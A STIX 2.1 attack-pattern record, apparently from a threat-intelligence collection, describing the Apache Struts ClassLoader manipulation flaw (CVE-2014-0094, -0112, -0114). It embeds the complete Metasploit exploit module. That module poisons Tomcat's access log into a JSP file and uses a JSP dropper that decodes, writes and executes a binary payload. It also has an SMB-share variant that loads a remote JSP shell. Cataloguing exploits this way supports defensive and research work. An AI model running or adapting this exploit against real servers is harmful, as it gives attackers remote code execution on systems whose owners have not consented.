{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9791abf-2225-49f0-8bf7-8bb86edc20ec",
    "created": "2024-08-14T17:10:09.928368Z",
    "modified": "2024-08-14T17:10:09.928371Z",
    "name": "Apache Struts ClassLoader Manipulation Remote Code Execution",
    "description": " This module exploits a remote command execution vulnerability in Apache Struts versions 1.x (<= 1.3.10) and 2.x (< 2.3.16.2). In Struts 1.x the problem is related with the ActionForm bean population mechanism while in case of Struts 2.x the vulnerability is due to the ParametersInterceptor. Both allow access to 'class' parameter that is directly mapped to getClass() method and allows ClassLoader manipulation. As a result, this can allow remote attackers to execute arbitrary Java code via crafted parameters. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts_code_exec_classloader.rb",
            "external_id": "struts_code_exec_classloader.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0094"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0112"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0114"
        },
        {
            "source_name": "reference",
            "url": "http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/"
        },
        {
            "source_name": "reference",
            "url": "http://struts.apache.org/release/2.3.x/docs/s2-020.html"
        },
        {
            "source_name": "reference",
            "url": "http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Update-your-Struts-1-ClassLoader-manipulation-filters/ba-p/6639204"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rgielen/struts1filter/tree/develop"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # It's going to manipulate the Class Loader\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts ClassLoader Manipulation Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a remote command execution vulnerability in Apache Struts versions\n        1.x (<= 1.3.10) and 2.x (< 2.3.16.2). In Struts 1.x the problem is related with\n        the ActionForm bean population mechanism while in case of Struts 2.x the vulnerability is due\n        to the ParametersInterceptor. Both allow access to 'class' parameter that is directly\n        mapped to getClass() method and allows ClassLoader manipulation. As a result, this can\n        allow remote attackers to execute arbitrary Java code via crafted parameters.\n      },\n      'Author'         =>\n        [\n          'Mark Thomas', # Vulnerability Discovery\n          'Przemyslaw Celej', # Vulnerability Discovery\n          'Redsadic <julian.vilas[at]gmail.com>', # Metasploit Module\n          'Matthew Hall <hallm[at]sec-1.com>' # SMB target\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2014-0094'],\n          ['CVE', '2014-0112'],\n          ['CVE', '2014-0114'],\n          ['URL', 'http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/'],\n          ['URL', 'http://struts.apache.org/release/2.3.x/docs/s2-020.html'],\n          ['URL', 'http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Update-your-Struts-1-ClassLoader-manipulation-filters/ba-p/6639204'],\n          ['URL', 'https://github.com/rgielen/struts1filter/tree/develop']\n        ],\n      'Platform'       => %w{ linux win },\n      'Payload'        =>\n        {\n          'Space' => 5000,\n          'DisableNops' => true\n        },\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Targets'        =>\n        [\n          ['Java',\n           {\n               'Arch'     => ARCH_JAVA,\n               'Platform' => %w{ linux win }\n           },\n          ],\n          ['Linux',\n           {\n               'Arch'     => ARCH_X86,\n               'Platform' => 'linux'\n           }\n          ],\n          ['Windows',\n            {\n              'Arch'     => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          ['Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Platform' => 'win'\n            }\n          ]\n        ],\n      'DisclosureDate' => '2014-03-06',\n      'DefaultTarget'  => 1))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptEnum.new('STRUTS_VERSION', [ true, 'Apache Struts Framework version', '2.x', ['1.x','2.x']]),\n        OptString.new('TARGETURI', [ true, 'The path to a struts application action', \"/struts2-blank/example/HelloWorld.action\"]),\n        OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 10])\n      ])\n\n    deregister_options('SHARE', 'FILE_NAME', 'FOLDER_NAME')\n  end\n\n  def jsp_dropper(file, exe)\n    dropper = <<-eos\n<%@ page import=\\\"java.io.FileOutputStream\\\" %>\n<%@ page import=\\\"sun.misc.BASE64Decoder\\\" %>\n<%@ page import=\\\"java.io.File\\\" %>\n<% FileOutputStream oFile = new FileOutputStream(\\\"#{file}\\\", false); %>\n<% oFile.write(new sun.misc.BASE64Decoder().decodeBuffer(\\\"#{Rex::Text.encode_base64(exe)}\\\")); %>\n<% oFile.flush(); %>\n<% oFile.close(); %>\n<% File f = new File(\\\"#{file}\\\"); %>\n<% f.setExecutable(true); %>\n<% Runtime.getRuntime().exec(\\\"./#{file}\\\"); %>\n    eos\n\n    dropper\n  end\n\n  def dump_line(uri, cmd = '')\n    res = send_request_cgi({\n      'uri'     => uri,\n      'encode_params' => false,\n      'vars_get' => {\n        cmd => ''\n      },\n      'version' => '1.1',\n      'method'  => 'GET'\n    })\n\n    res\n  end\n\n  def modify_class_loader(opts)\n\n    cl_prefix =\n      case datastore['STRUTS_VERSION']\n      when '1.x' then \"class.classLoader\"\n      when '2.x' then \"class['classLoader']\"\n      end\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(target_uri.path.to_s),\n      'version' => '1.1',\n      'method'  => 'GET',\n      'vars_get' => {\n        \"#{cl_prefix}.resources.context.parent.pipeline.first.directory\"      => opts[:directory],\n        \"#{cl_prefix}.resources.context.parent.pipeline.first.prefix\"         => opts[:prefix],\n        \"#{cl_prefix}.resources.context.parent.pipeline.first.suffix\"         => opts[:suffix],\n        \"#{cl_prefix}.resources.context.parent.pipeline.first.fileDateFormat\" => opts[:file_date_format]\n      }\n    })\n\n    res\n  end\n\n  def check_log_file(hint)\n    uri = normalize_uri(\"/\", @jsp_file)\n\n    print_status(\"Waiting for the server to flush the logfile\")\n\n    10.times do |x|\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger payload\n      vprint_status(\"Countdown #{10-x}...\")\n      res = dump_line(uri)\n\n      # Failure. The request timed out or the server went away.\n      fail_with(Failure::TimeoutExpired, \"#{peer} - Not received response\") if res.nil?\n\n      # Success if the server has flushed all the sent commands to the jsp file\n      if res.code == 200 && res.body && res.body.to_s =~ /#{hint}/\n        print_good(\"Log file flushed at http://#{peer}/#{@jsp_file}\")\n        return true\n      end\n    end\n\n    false\n  end\n\n  # Fix the JSP payload to make it valid once is dropped\n  # to the log file\n  def fix(jsp)\n    output = \"\"\n    jsp.each_line do |l|\n      if l =~ /<%.*%>/\n        output << l\n      elsif l =~ /<%/\n        next\n      elsif l=~ /%>/\n        next\n      elsif l.chomp.empty?\n        next\n      else\n        output << \"<% #{l.chomp} %>\"\n      end\n    end\n    output\n  end\n\n  def create_jsp\n    if target['Arch'] == ARCH_JAVA\n      jsp = fix(payload.encoded)\n    else\n      if target['Platform'] == 'win'\n        payload_exe = Msf::Util::EXE.to_executable_fmt(framework, target.arch, target.platform, payload.encoded, \"exe-small\", {:arch => target.arch, :platform => target.platform})\n      else\n        payload_exe = generate_payload_exe\n      end\n      payload_file = rand_text_alphanumeric(4 + rand(4))\n      jsp = jsp_dropper(payload_file, payload_exe)\n\n      register_files_for_cleanup(payload_file)\n    end\n\n    jsp\n  end\n\n  def exploit\n    if target.name =~ /Remote SMB Resource/\n      begin\n        Timeout.timeout(datastore['SMB_DELAY']) { super }\n      rescue Timeout::Error\n        # do nothing... just finish exploit and stop smb server...\n      end\n    else\n      class_loader_exploit\n    end\n  end\n\n  def setup\n    super\n\n    self.file_name << '.jsp'\n    self.file_contents = payload.encoded\n  end\n\n  # Used with SMB targets\n  def primer\n    print_status(\"JSP payload available on #{unc}...\")\n\n    print_status(\"Modifying Class Loader...\")\n    send_request_cgi({\n      'uri'     => normalize_uri(target_uri.path.to_s),\n      'version' => '1.1',\n      'method'  => 'GET',\n      'vars_get' => {\n        'class[\\'classLoader\\'].resources.dirContext.docBase' => \"\\\\\\\\#{srvhost}\\\\#{share}\"\n      }\n    })\n\n    jsp_shell = target_uri.path.to_s.split('/')[0..-2].join('/')\n    jsp_shell << \"/#{self.file_name}\"\n\n    print_status(\"Accessing JSP shell at #{jsp_shell}...\")\n    send_request_cgi({\n      'uri'     => normalize_uri(jsp_shell),\n      'version' => '1.1',\n      'method'  => 'GET',\n    })\n  end\n\n  def class_loader_exploit\n    prefix_jsp = rand_text_alphanumeric(3+rand(3))\n    date_format = rand_text_numeric(1+rand(4))\n    @jsp_file = prefix_jsp + date_format + \".jsp\"\n\n    # Modify the Class Loader\n\n    print_status(\"Modifying Class Loader...\")\n    properties = {\n      :directory      => 'webapps/ROOT',\n      :prefix         => prefix_jsp,\n      :suffix         => '.jsp',\n      :file_date_format => date_format\n    }\n    res = modify_class_loader(properties)\n    unless res\n      fail_with(Failure::TimeoutExpired, \"#{peer} - No answer\")\n    end\n\n    # Check if the log file exists and has been flushed\n\n    unless check_log_file(normalize_uri(target_uri.to_s))\n      fail_with(Failure::Unknown, \"#{peer} - The log file hasn't been flushed\")\n    end\n\n    register_files_for_cleanup(@jsp_file)\n\n    # Prepare the JSP\n    print_status(\"Generating JSP...\")\n    jsp = create_jsp\n\n    # Dump the JSP to the log file\n    print_status(\"Dumping JSP into the logfile...\")\n    random_request = rand_text_alphanumeric(3 + rand(3))\n\n    uri = normalize_uri('/', random_request)\n\n    jsp.each_line do |l|\n      unless dump_line(uri, l.chomp)\n        fail_with(Failure::Unknown, \"#{peer} - Missed answer while dumping JSP to logfile...\")\n      end\n    end\n\n    # Check log file... enjoy shell!\n    check_log_file(random_request)\n\n    # No matter what happened, try to 'restore' the Class Loader\n    properties = {\n        :directory      => '',\n        :prefix         => '',\n        :suffix         => '',\n        :file_date_format => ''\n    }\n    modify_class_loader(properties)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-06",
    "x_mitre_platforms": [
        "win"
    ]
}